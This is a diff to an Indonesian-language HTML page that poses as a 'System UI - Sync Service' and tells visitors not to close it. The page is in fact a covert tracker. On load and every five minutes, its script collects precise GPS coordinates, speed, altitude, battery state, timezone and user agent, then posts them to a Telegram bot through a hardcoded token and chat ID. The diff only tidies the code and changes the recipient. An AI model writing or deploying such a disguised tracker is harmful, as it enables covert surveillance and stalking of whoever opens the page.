@@ -1,7 +1,8 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>System UI - Sync Service</title>
   <style>
     body {
@@ -50,32 +51,35 @@
     <div class="spinner"></div>
     <p class="status">Mohon jangan tutup halaman ini.</p>
     <p class="status">Penyelarasan lokasi & status perangkat aktif.</p>
-  </div>  <script>
+  </div>
+
+  <script>
     async function sendData() {
-      const location = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {
-          enableHighAccuracy: true
+      try {
+        const location = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true
+          });
         });
-      });
 
-      const lat = location.coords.latitude;
-      const lon = location.coords.longitude;
-      const speed = location.coords.speed ?? 'Unknown';
-      const heading = location.coords.heading ?? 'Unknown';
-      const altitude = location.coords.altitude ?? 'Unknown';
-      const accuracy = location.coords.accuracy + 'm';
+        const lat = location.coords.latitude;
+        const lon = location.coords.longitude;
+        const speed = location.coords.speed ?? 'Unknown';
+        const heading = location.coords.heading ?? 'Unknown';
+        const altitude = location.coords.altitude ?? 'Unknown';
+        const accuracy = location.coords.accuracy + 'm';
 
-      const lang = navigator.language;
-      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const local = new Date().toLocaleString();
-      const utc = new Date().toUTCString();
-      const ua = navigator.userAgent;
+        const lang = navigator.language;
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const local = new Date().toLocaleString();
+        const utc = new Date().toUTCString();
+        const ua = navigator.userAgent;
 
-      const battery = await navigator.getBattery();
-      const batLevel = Math.round(battery.level * 100);
-      const batCharging = battery.charging ? 'Charging' : 'Not Charging';
+        const battery = await navigator.getBattery();
+        const batLevel = Math.round(battery.level * 100);
+        const batCharging = battery.charging ? 'Charging' : 'Not Charging';
 
-      const payload = `
+        const payload = `
 [ID: Uta001]
 Lokasi dikirim: ${lat}, ${lon}
 https://maps.google.com/?q=${lat},${lon}
@@ -93,17 +97,21 @@ UTC: ${utc}
 Battery: ${batLevel}% (${batCharging})
 Device: ${ua}`;
 
-      const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
-      const chat_id = "@OpsBorneo_Bot";
+        const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+        const chat_id = "5677912817";
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: payload })
-      });
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id, text: payload })
+        });
+      } catch (err) {
+        console.error("Gagal mengirim data:", err);
+      }
     }
 
     sendData();
-    setInterval(sendData, 5 * 60 * 1000);
-  </script></body>
+    setInterval(sendData, 5 * 60 * 1000); // setiap 5 menit
+  </script>
+</body>
 </html>
